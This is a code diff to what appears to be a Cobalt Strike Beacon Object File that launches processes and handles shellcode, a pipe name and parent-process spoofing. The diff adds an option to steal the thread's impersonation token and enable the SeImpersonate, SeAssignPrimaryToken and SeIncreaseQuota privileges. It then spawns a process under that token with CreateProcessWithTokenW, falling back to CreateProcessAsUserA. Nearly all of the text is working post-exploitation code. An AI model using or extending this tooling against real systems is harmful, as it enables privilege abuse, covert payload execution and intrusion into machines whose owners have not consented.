@@ -252,6 +252,7 @@ void go(char* args, int len) {
     char* pipeName = BeaconDataExtract(&parser, NULL);  // Pipe name for PPID mode
     int shellcode_len = 0;
     char* shellcode = BeaconDataExtract(&parser, &shellcode_len);
+    int useToken = BeaconDataInt(&parser); // New argument
 
     // --- Dynamic Resolution ---
     HMODULE hKernel32 = KERNEL32$GetModuleHandleA("kernel32.dll");
@@ -488,6 +489,18 @@ void go(char* args, int len) {
     HANDLE hDupToken = NULL;
     HMODULE hAdvapi32 = KERNEL32$LoadLibraryA("advapi32.dll");
     
+    typedef BOOL (WINAPI *EXP_CreateProcessWithTokenW)(HANDLE, DWORD, LPCWSTR, LPWSTR, DWORD, LPVOID, LPCWSTR, LPSTARTUPINFOW, LPPROCESS_INFORMATION);
+    typedef int (WINAPI *EXP_MultiByteToWideChar)(UINT, DWORD, LPCSTR, int, LPWSTR, int);
+    typedef BOOL (WINAPI *EXP_AdjustTokenPrivileges)(HANDLE, BOOL, PTOKEN_PRIVILEGES, DWORD, PTOKEN_PRIVILEGES, PDWORD);
+    typedef BOOL (WINAPI *EXP_LookupPrivilegeValueA)(LPCSTR, LPCSTR, PLUID);
+    typedef BOOL (WINAPI *EXP_OpenThreadToken)(HANDLE, DWORD, BOOL, PHANDLE);
+    typedef HANDLE (WINAPI *EXP_GetCurrentThread)();
+
+    EXP_CreateProcessWithTokenW pCreateProcessWithTokenW = NULL;
+    EXP_MultiByteToWideChar pMultiByteToWideChar = (EXP_MultiByteToWideChar)KERNEL32$GetProcAddress(hKernel32, "MultiByteToWideChar");
+    EXP_AdjustTokenPrivileges pAdjustTokenPrivileges = NULL;
+    EXP_LookupPrivilegeValueA pLookupPrivilegeValueA = NULL;
+    
     // Resolve APIs
     if (hAdvapi32) {
          EXP_OpenProcessToken pOpenProcessToken = (EXP_OpenProcessToken)KERNEL32$GetProcAddress(hAdvapi32, "OpenProcessToken");
@@ -495,11 +508,58 @@ void go(char* args, int len) {
          EXP_InitializeSecurityDescriptor pInitializeSecurityDescriptor = (EXP_InitializeSecurityDescriptor)KERNEL32$GetProcAddress(hAdvapi32, "InitializeSecurityDescriptor");
          EXP_SetSecurityDescriptorDacl pSetSecurityDescriptorDacl = (EXP_SetSecurityDescriptorDacl)KERNEL32$GetProcAddress(hAdvapi32, "SetSecurityDescriptorDacl");
          
+         EXP_OpenThreadToken pOpenThreadToken = (EXP_OpenThreadToken)KERNEL32$GetProcAddress(hAdvapi32, "OpenThreadToken");
+         EXP_GetCurrentThread pGetCurrentThread = (EXP_GetCurrentThread)KERNEL32$GetProcAddress(KERNEL32$GetModuleHandleA("kernel32.dll"), "GetCurrentThread");
+
+         pCreateProcessWithTokenW = (EXP_CreateProcessWithTokenW)KERNEL32$GetProcAddress(hAdvapi32, "CreateProcessWithTokenW");
+         pAdjustTokenPrivileges = (EXP_AdjustTokenPrivileges)KERNEL32$GetProcAddress(hAdvapi32, "AdjustTokenPrivileges");
+         pLookupPrivilegeValueA = (EXP_LookupPrivilegeValueA)KERNEL32$GetProcAddress(hAdvapi32, "LookupPrivilegeValueA");
+         
          if (pOpenProcessToken && pDuplicateTokenEx && pInitializeSecurityDescriptor && pSetSecurityDescriptorDacl) {
              HANDLE hCurrentToken = NULL;
-             // Use pseudo-handle for current process
-             if (pOpenProcessToken((HANDLE)-1, TOKEN_ALL_ACCESS, &hCurrentToken)) {
-                 
+             BOOL tokenFound = FALSE;
+             
+             // 1. Try to open the Thread Token first (Impersonation) - ONLY IF REQUESTED
+             if (useToken && pOpenThreadToken && pGetCurrentThread) {
+                 if (pOpenThreadToken(pGetCurrentThread(), TOKEN_ALL_ACCESS, TRUE, &hCurrentToken)) {
+                     tokenFound = TRUE;
+                     // BeaconPrintf(CALLBACK_OUTPUT, "[*] Using Impersonation Token (Explicitly Requested)");
+                 } else {
+                     BeaconPrintf(CALLBACK_ERROR, "[!] Failed to open Thread Token, falling back to Process Token.");
+                 }
+             }
+
+              // 2. Fallback to Process Token (if not requested or failed)
+             if (!tokenFound) {
+                 // Use pseudo-handle for current process
+                 if (pOpenProcessToken((HANDLE)-1, TOKEN_ALL_ACCESS, &hCurrentToken)) {
+                     tokenFound = TRUE;
+                     // BeaconPrintf(CALLBACK_OUTPUT, "[*] Using Process Token");
+                 }
+             }
+             
+             if (tokenFound && hCurrentToken) {
+                 // Explicitly Enable Privileges if we are using an Impersonation Token (or requested to use token)
+                 // This logic helps CreateProcessWithTokenW succeed.
+                 if (useToken && pAdjustTokenPrivileges && pLookupPrivilegeValueA) {
+                     // Inline SetPrivilege logic
+                     TOKEN_PRIVILEGES tp;
+                     LUID luid;
+                     
+                     if (pLookupPrivilegeValueA(NULL, "SeImpersonatePrivilege", &luid)) {
+                         tp.PrivilegeCount = 1; tp.Privileges[0].Luid = luid; tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
+                         pAdjustTokenPrivileges(hCurrentToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL);
+                     }
+                     if (pLookupPrivilegeValueA(NULL, "SeAssignPrimaryTokenPrivilege", &luid)) {
+                         tp.PrivilegeCount = 1; tp.Privileges[0].Luid = luid; tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
+                         pAdjustTokenPrivileges(hCurrentToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL);
+                     }
+                      if (pLookupPrivilegeValueA(NULL, "SeIncreaseQuotaPrivilege", &luid)) {
+                         tp.PrivilegeCount = 1; tp.Privileges[0].Luid = luid; tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
+                         pAdjustTokenPrivileges(hCurrentToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL);
+                     }
+                 }
+
                  // Create a permissive security descriptor (NULL DACL)
                  SECURITY_DESCRIPTOR sd;
                  pInitializeSecurityDescriptor(&sd, SECURITY_DESCRIPTOR_REVISION);
@@ -520,12 +580,47 @@ void go(char* args, int len) {
     BOOL bInheritHandles = !usePipeClient; // TRUE for standard, FALSE for pipe client (PPID)
 
     if (hDupToken && hAdvapi32) {
-        EXP_CreateProcessAsUserA pCreateProcessAsUserA = (EXP_CreateProcessAsUserA)KERNEL32$GetProcAddress(hAdvapi32, "CreateProcessAsUserA");
-        if (pCreateProcessAsUserA) {
-             processSuccess = pCreateProcessAsUserA(hDupToken, NULL, program, NULL, NULL, bInheritHandles, creationFlags, NULL, NULL, si_ptr, &pi);
-        } else {
-             // Fallback
-             processSuccess = KERNEL32$CreateProcessA(NULL, program, NULL, NULL, bInheritHandles, creationFlags, NULL, NULL, si_ptr, &pi);
+        
+        // Try CreateProcessWithTokenW first if we have a duplicated token (preferred for Impersonation)
+        if (useToken && pCreateProcessWithTokenW && pMultiByteToWideChar) {
+            
+            // Convert Program and Args to WideChar
+            int progLen = pMultiByteToWideChar(CP_ACP, 0, program, -1, NULL, 0);
+            LPWSTR wProgram = (LPWSTR)pLocalAlloc(LPTR, progLen * sizeof(WCHAR));
+            pMultiByteToWideChar(CP_ACP, 0, program, -1, wProgram, progLen);
+
+            STARTUPINFOW siw;
+            _memset(&siw, 0, sizeof(STARTUPINFOW));
+            siw.cb = sizeof(STARTUPINFOW);
+            
+            // Map startup info from ANSI to Wide (basic mapping)
+            if (si_ptr) {
+                 siw.dwFlags = si_ptr->dwFlags;
+                 siw.wShowWindow = si_ptr->wShowWindow;
+                 siw.hStdInput = si_ptr->hStdInput;
+                 siw.hStdOutput = si_ptr->hStdOutput;
+                 siw.hStdError = si_ptr->hStdError;
+            }
+
+            // Note: CreateProcessWithTokenW does NOT support EXTENDED_STARTUPINFO_PRESENT
+            // So we strip that flag if present, meaning PPID spoofing might not work with this API.
+            DWORD dwCreationFlagsW = creationFlags & ~EXTENDED_STARTUPINFO_PRESENT;
+
+            // LOGON_WITH_PROFILE = 0x00000001
+            processSuccess = pCreateProcessWithTokenW(hDupToken, 0x00000001, NULL, wProgram, dwCreationFlagsW, NULL, NULL, &siw, &pi);
+            
+            pLocalFree(wProgram);
+        }
+    
+        // Fallback to CreateProcessAsUserA
+        if (!processSuccess) {
+            EXP_CreateProcessAsUserA pCreateProcessAsUserA = (EXP_CreateProcessAsUserA)KERNEL32$GetProcAddress(hAdvapi32, "CreateProcessAsUserA");
+            if (pCreateProcessAsUserA) {
+                 processSuccess = pCreateProcessAsUserA(hDupToken, NULL, program, NULL, NULL, bInheritHandles, creationFlags, NULL, NULL, si_ptr, &pi);
+            } else {
+                 // Fallback
+                 processSuccess = KERNEL32$CreateProcessA(NULL, program, NULL, NULL, bInheritHandles, creationFlags, NULL, NULL, si_ptr, &pi);
+            }
         }
         KERNEL32$CloseHandle(hDupToken);
     } else {
